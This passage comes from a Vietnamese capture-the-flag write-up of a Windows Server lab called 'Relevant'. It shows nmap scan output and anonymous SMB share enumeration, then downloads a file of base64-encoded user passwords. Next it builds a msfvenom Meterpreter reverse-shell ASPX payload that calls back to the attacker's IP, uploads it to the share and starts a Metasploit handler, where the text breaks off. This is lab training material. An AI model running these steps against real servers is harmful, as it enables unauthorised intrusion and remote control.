+</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>  <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2016</span> <span class="nx">Standard</span> <span class="nx">Evaluation</span> <span class="mi">14393</span> <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span> <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">Microsoft</span> <span class="nx">Terminal</span> <span class="nx">Services</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="o">:</span> <span class="nx">Subject</span><span class="o">:</span> <span class="nx">commonName</span><span class="o">=</span><span class="nx">Relevant</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">Issuer</span><span class="o">:</span> <span class="nx">commonName</span><span class="o">=</span><span class="nx">Relevant</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">Public</span> <span class="nx">Key</span> <span class="nx">type</span><span class="o">:</span> <span class="nx">rsa</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">Public</span> <span class="nx">Key</span> <span class="nx">bits</span><span class="o">:</span> <span class="mi">2048</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">Signature</span> <span class="nx">Algorithm</span><span class="o">:</span> <span class="nx">sha256WithRSAEncryption</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">Not</span> <span class="nx">valid</span> <span class="nx">before</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">08</span><span class="nx">T07</span><span class="o">:</span><span class="mi">29</span><span class="o">:</span><span class="mi">30</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">Not</span> <span class="nx">valid</span> <span class="nx">after</span><span class="o">:</span>  <span class="mi">2023</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">07</span><span class="nx">T07</span><span class="o">:</span><span class="mi">29</span><span class="o">:</span><span class="mi">30</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">MD5</span><span class="o">:</span>   <span class="mi">58</span><span class="nx">fd</span> <span class="mi">9021</span> <span class="nx">e69c</span> <span class="mi">979</span><span class="nx">c</span> <span class="nx">b9b2</span> <span class="mi">83</span><span class="nx">b3</span> <span class="mi">5</span><span class="nx">b20</span> <span class="mf">59e1</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">SHA</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span> <span class="mi">5</span><span class="nx">f3c</span> <span class="mi">2</span><span class="nx">cb7</span> <span class="mi">9</span><span class="nx">ff0</span> <span class="nx">b109</span> <span class="mi">443</span><span class="nx">b</span> <span class="mi">9813</span> <span class="mi">6</span><span class="nx">fad</span> <span class="mi">5768</span> <span class="nx">a5c8</span> <span class="mf">03e4</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="o">-----</span><span class="nx">BEGIN</span> <span class="nx">CERTIFICATE</span><span class="o">-----</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">MIIC1DCCAbygAwIBAgIQI</span><span class="o">/</span><span class="nx">Rvv</span><span class="o">/</span><span class="nx">LKG6hAIETCfD4qYzANBgkqhkiG9w0BAQsFADAT</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMjA4MDgwNzI5MzBaFw0yMzAyMDcwNzI5</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">MzBaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">MIIBCgKCAQEAridw40n6SvFc</span><span class="o">+</span><span class="nx">v8JUCzyg</span><span class="o">/</span><span class="nx">kr4MHV6PuHxOSUa0ULDlwkoSYBJeWa</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">jouI1vOzfKyZe9t6J6xiyaG3cMu7gBswCVemW3JaUSq3M0KpJTXMGZq</span><span class="o">/</span><span class="nx">UGU87TxD</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">TIsgEwVxX8FyzANIDk1a4st</span><span class="o">+</span><span class="mi">6</span><span class="nx">xFQeES33zXBlsGbVidxW7Shh3hPAKa5tt</span><span class="o">/</span><span class="nx">u1xYO</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">md9Wg</span><span class="o">+</span><span class="nx">amFM1mv</span><span class="o">+</span><span class="nx">afZJ4LSEt7qfS35sqoOIqER0Na2HXS5CfcfRUc34QfOtPbaGsd</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">3</span><span class="nx">zJfFh6idnIxWrWIMBzt5JJuG286zttjM1jZWIUuevA2kIgIlDf</span><span class="o">/</span><span class="mi">5</span><span class="nx">Pngnodc2sE4</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">G7h24ATGycCUaymwpq4ocB7B3idm6ZnqpQIDAQABoyQwIjATBgNVHSUEDDAKBggr</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKrQPuiiz</span><span class="o">++</span><span class="nx">z</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ufha6p579FYmyeHrzk1vDW9paLmFt3ic0E6E5GP25</span><span class="o">/</span><span class="nx">NfwlObSmXwbr</span><span class="o">+</span><span class="mi">1</span><span class="nx">seFJf00Z</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">SqF2u730F44xdTGzT11gLub69fcXRFerO251m5XwabPmhsHehs0jTYd85wbU2u4t</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">hGa</span><span class="o">+</span><span class="nx">U8WZCFRPk</span><span class="o">+</span><span class="nx">mAIkTOB3yMRjQEG0FQzQZEL</span><span class="o">/</span><span class="mi">7</span><span class="nx">BX1</span><span class="o">/</span><span class="nx">RPdgWhB0eDeNoYEMw64wH</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">MT0</span><span class="o">+</span><span class="mi">4</span><span class="o">/</span><span class="nx">BTFwxiRqylzbExqec8bxTN58KGIDGemMHYYyBGMlg4Wmb</span><span class="o">+</span><span class="nx">t</span><span class="o">+</span><span class="nx">dXPEIBeCOf</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="o">+</span><span class="err">/2+Kr2+63Hcfs9Byl79YftuK8LyXYkFfBRShNvoSi/WukJa/qCyQfUvAGcZC2QW</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">rpp8f0Bu6ac</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span><span class="o">-----</span><span class="nx">END</span> <span class="nx">CERTIFICATE</span><span class="o">-----</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="nx">T07</span><span class="o">:</span><span class="mi">35</span><span class="o">:</span><span class="mi">45</span><span class="o">+</span><span class="mi">00</span><span class="o">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">-</span><span class="mi">12</span><span class="nx">s</span> <span class="nx">from</span> <span class="nx">scanner</span> <span class="nx">time</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">rdp</span><span class="o">-</span><span class="nx">ntlm</span><span class="o">-</span><span class="nx">info</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Target_Name</span><span class="o">:</span> <span class="nx">RELEVANT</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">NetBIOS_Domain_Name</span><span class="o">:</span> <span class="nx">RELEVANT</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">NetBIOS_Computer_Name</span><span class="o">:</span> <span class="nx">RELEVANT</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">DNS_Domain_Name</span><span class="o">:</span> <span class="nx">Relevant</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">DNS_Computer_Name</span><span class="o">:</span> <span class="nx">Relevant</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Product_Version</span><span class="o">:</span> <span class="mf">10.0</span><span class="p">.</span><span class="mi">14393</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">System_Time</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="nx">T07</span><span class="o">:</span><span class="mi">35</span><span class="o">:</span><span class="mi">08</span><span class="o">+</span><span class="mi">00</span><span class="o">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49663</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>          <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="nx">httpd</span> <span class="mf">10.0</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="o">:</span> <span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="mf">10.0</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="o">:</span> <span class="nx">IIS</span> <span class="nx">Windows</span> <span class="nx">Server</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Supported</span> <span class="nx">Methods</span><span class="o">:</span> <span class="nx">OPTIONS</span> <span class="nx">TRACE</span> <span class="nx">GET</span> <span class="nx">HEAD</span> <span class="nx">POST</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">Potentially</span> <span class="nx">risky</span> <span class="nx">methods</span><span class="o">:</span> <span class="nx">TRACE</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49667</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">msrpc</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49669</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">msrpc</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">Microsoft</span> <span class="nx">Windows</span> <span class="nx">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Service</span> <span class="nx">Info</span><span class="o">:</span> <span class="nx">OSs</span><span class="o">:</span> <span class="nx">Windows</span><span class="p">,</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2008</span> <span class="nx">R2</span> <span class="o">-</span> <span class="mi">2012</span><span class="p">;</span> <span class="nx">CPE</span><span class="o">:</span> <span class="nx">cpe</span><span class="o">:</span><span class="err">/o:microsoft:windows</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span> <span class="nx">script</span> <span class="nx">results</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_clock</span><span class="o">-</span><span class="nx">skew</span><span class="o">:</span> <span class="nx">mean</span><span class="o">:</span> <span class="mi">1</span><span class="nx">h23m48s</span><span class="p">,</span> <span class="nx">deviation</span><span class="o">:</span> <span class="mi">3</span><span class="nx">h07m51s</span><span class="p">,</span> <span class="nx">median</span><span class="o">:</span> <span class="o">-</span><span class="mi">12</span><span class="nx">s</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mf">3.1</span><span class="p">.</span><span class="mi">1</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>    <span class="nx">Message</span> <span class="nx">signing</span> <span class="nx">enabled</span> <span class="nx">but</span> <span class="nx">not</span> <span class="nx">required</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">smb</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">account_used</span><span class="o">:</span> <span class="nx">guest</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">authentication_level</span><span class="o">:</span> <span class="nx">user</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">challenge_response</span><span class="o">:</span> <span class="nx">supported</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">message_signing</span><span class="o">:</span> <span class="nx">disabled</span> <span class="p">(</span><span class="nx">dangerous</span><span class="p">,</span> <span class="nx">but</span> <span class="k">default</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">date</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="nx">T07</span><span class="o">:</span><span class="mi">35</span><span class="o">:</span><span class="mi">07</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">start_date</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="nx">T07</span><span class="o">:</span><span class="mi">30</span><span class="o">:</span><span class="mi">05</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">smb</span><span class="o">-</span><span class="nx">os</span><span class="o">-</span><span class="nx">discovery</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">OS</span><span class="o">:</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2016</span> <span class="nx">Standard</span> <span class="nx">Evaluation</span> <span class="mi">14393</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2016</span> <span class="nx">Standard</span> <span class="nx">Evaluation</span> <span class="mf">6.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Computer</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">Relevant</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">NetBIOS</span> <span class="nx">computer</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">RELEVANT</span><span class="err">\</span><span class="nx">x00</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Workgroup</span><span class="o">:</span> <span class="nx">WORKGROUP</span><span class="err">\</span><span class="nx">x00</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">System</span> <span class="nx">time</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="nx">T00</span><span class="o">:</span><span class="mi">35</span><span class="o">:</span><span class="mi">08</span><span class="o">-</span><span class="mi">07</span><span class="o">:</span><span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">p2p</span><span class="o">-</span><span class="nx">conficker</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Checking</span> <span class="k">for</span> <span class="nx">Conficker</span><span class="p">.</span><span class="nx">C</span> <span class="nx">or</span> <span class="nx">higher</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Check</span> <span class="mi">1</span> <span class="p">(</span><span class="nx">port</span> <span class="mi">58498</span><span class="o">/</span><span class="nx">tcp</span><span class="p">)</span><span class="o">:</span> <span class="nx">CLEAN</span> <span class="p">(</span><span class="nx">Timeout</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Check</span> <span class="mi">2</span> <span class="p">(</span><span class="nx">port</span> <span class="mi">13141</span><span class="o">/</span><span class="nx">tcp</span><span class="p">)</span><span class="o">:</span> <span class="nx">CLEAN</span> <span class="p">(</span><span class="nx">Timeout</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Check</span> <span class="mi">3</span> <span class="p">(</span><span class="nx">port</span> <span class="mi">46642</span><span class="o">/</span><span class="nx">udp</span><span class="p">)</span><span class="o">:</span> <span class="nx">CLEAN</span> <span class="p">(</span><span class="nx">Timeout</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">Check</span> <span class="mi">4</span> <span class="p">(</span><span class="nx">port</span> <span class="mi">13285</span><span class="o">/</span><span class="nx">udp</span><span class="p">)</span><span class="o">:</span> <span class="nx">CLEAN</span> <span class="p">(</span><span class="nx">Timeout</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="mi">0</span><span class="o">/</span><span class="mi">4</span> <span class="nx">checks</span> <span class="nx">are</span> <span class="nx">positive</span><span class="o">:</span> <span class="nx">Host</span> <span class="nx">is</span> <span class="nx">CLEAN</span> <span class="nx">or</span> <span class="nx">ports</span> <span class="nx">are</span> <span class="nx">blocked</span></span></span></code></pre></div></div>
+<p>Tôi có 1 Window server ở đây với port 139 và 445 của SMB service. Thử ghé qua 2 port này trước xem có khai thác được thông tin gì không.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">neo</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> \\\\<span class="mf">10.10.84.34</span>
+</span></span><span class="line"><span class="cl"><span class="n">Password</span> <span class="k">for</span> <span class="p">[</span><span class="n">WORKGROUP</span>\<span class="n">neo</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Sharename</span>       <span class="n">Type</span>      <span class="n">Comment</span>
+</span></span><span class="line"><span class="cl">        <span class="o">---------</span>       <span class="o">----</span>      <span class="o">-------</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ADMIN</span><span class="err">$</span>          <span class="n">Disk</span>      <span class="n">Remote</span> <span class="n">Admin</span>
+</span></span><span class="line"><span class="cl">        <span class="n">C</span><span class="err">$</span>              <span class="n">Disk</span>      <span class="n">Default</span> <span class="n">share</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IPC</span><span class="err">$</span>            <span class="n">IPC</span>       <span class="n">Remote</span> <span class="n">IPC</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nt4wrksv</span>        <span class="n">Disk</span>      
+</span></span><span class="line"><span class="cl"><span class="n">Reconnecting</span> <span class="k">with</span> <span class="n">SMB1</span> <span class="k">for</span> <span class="n">workgroup</span> <span class="n">listing</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_connect</span><span class="p">:</span> <span class="n">Connection</span> <span class="n">to</span> <span class="mf">10.10.84.34</span> <span class="n">failed</span> <span class="p">(</span><span class="n">Error</span> <span class="n">NT_STATUS_RESOURCE_NAME_NOT_FOUND</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Unable</span> <span class="n">to</span> <span class="n">connect</span> <span class="k">with</span> <span class="n">SMB1</span> <span class="o">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span></span></span></code></pre></div></div>
+<p>Chúng ta có 1 folder tên <code>nt4wrksv</code>. Thử truy cập vào thư mục này và tôi có 1 file password.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">neo</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">smbclient</span> \\\\<span class="mf">10.10.84.34</span>\\<span class="n">nt4wrksv</span>  
+</span></span><span class="line"><span class="cl"><span class="n">Password</span> <span class="k">for</span> <span class="p">[</span><span class="n">WORKGROUP</span>\<span class="n">neo</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Try</span> <span class="s2">&#34;help&#34;</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="nb">dir</span>
+</span></span><span class="line"><span class="cl">  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">25</span> <span class="mi">17</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">04</span> <span class="mi">2020</span>
+</span></span><span class="line"><span class="cl">  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">25</span> <span class="mi">17</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">04</span> <span class="mi">2020</span>
+</span></span><span class="line"><span class="cl">  <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span>                       <span class="n">A</span>       <span class="mi">98</span>  <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">25</span> <span class="mi">11</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">33</span> <span class="mi">2020</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="mi">7735807</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">4096.</span> <span class="mi">4944824</span> <span class="n">blocks</span> <span class="n">available</span>
+</span></span><span class="line"><span class="cl"><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">get</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> 
+</span></span><span class="line"><span class="cl"><span class="n">getting</span> <span class="n">file</span> \<span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">98</span> <span class="k">as</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="p">(</span><span class="mf">0.0</span> <span class="n">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">0.0</span> <span class="n">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>Lấy nó về và xem bên trong có gì nào.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">neo</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">cat</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span>  
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">User</span> <span class="n">Passwords</span> <span class="o">-</span> <span class="n">Encoded</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Qm9iIC0gIVBAJCRXMHJEITEyMw</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl"><span class="n">QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk</span></span></span></code></pre></div></div>
+<p>Tôi hay sử dụng <a href="https://kt.gy/"  target="_blank" rel="noreferrer">web này</a> để decrypt những base phổ biến như 16, 32, 64, v.v.. Với dòng đầu tiên tôi có user-pass của <strong>Bob</strong> và dòng thứ 2 là user-pass của <strong>Bill</strong>.</p>
+<p>Do đây là window server nên tôi sẽ thử tạo Meterpreter payload và đẩy nó vào share file:</p>
+<p><code>msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.18.3.74 lport=2402 -f aspx -o shell.aspx</code></p>
+<p>Ở đây tôi sử dụng msfvenom với:</p>
+<p><code>-p</code>: lựa chọn payload muốn đẩy</p>
+<p><code>lhost</code> và <code>lport</code> là ip litsener của máy tôi</p>
+<p><code>-f</code>: chọn định dạng file sẽ xuất ra</p>
+<p><code>-o</code>: tạo file với tên shell.aspx</p>
+<p>Chờ 1 lúc để file tạo thành công</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">put</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">neo</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">aspx</span> <span class="n">shell</span><span class="o">.</span><span class="n">aspx</span>
+</span></span><span class="line"><span class="cl"><span class="n">putting</span> <span class="n">file</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">neo</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">aspx</span> <span class="k">as</span> \<span class="n">shell</span><span class="o">.</span><span class="n">aspx</span> <span class="p">(</span><span class="mf">296.6</span> <span class="n">kb</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">296.6</span> <span class="n">kb</span><span class="o">/</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="nb">dir</span>
+</span></span><span class="line"><span class="cl">  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Tue</span> <span class="n">Aug</span>  <span class="mi">9</span> <span class="mi">05</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">44</span> <span class="mi">2022</span>
+</span></span><span class="line"><span class="cl">  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Tue</span> <span class="n">Aug</span>  <span class="mi">9</span> <span class="mi">05</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">44</span> <span class="mi">2022</span>
+</span></span><span class="line"><span class="cl">  <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span>                       <span class="n">A</span>       <span class="mi">98</span>  <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">25</span> <span class="mi">11</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">33</span> <span class="mi">2020</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shell</span><span class="o">.</span><span class="n">aspx</span>                          <span class="n">A</span>  <span class="mi">1013006</span>  <span class="n">Tue</span> <span class="n">Aug</span>  <span class="mi">9</span> <span class="mi">05</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">47</span> <span class="mi">2022</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="mi">7735807</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">4096.</span> <span class="mi">4912865</span> <span class="n">blocks</span> <span class="n">available</span></span></span></code></pre></div></div>
+<p>Vậy là up shell thành công. Tạo listener với Metasploit</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">configured</span> <span class="n">payload</span> <span class="n">generic</span><span class="o">/</span><span class="n">shell_reverse_tcp</span>
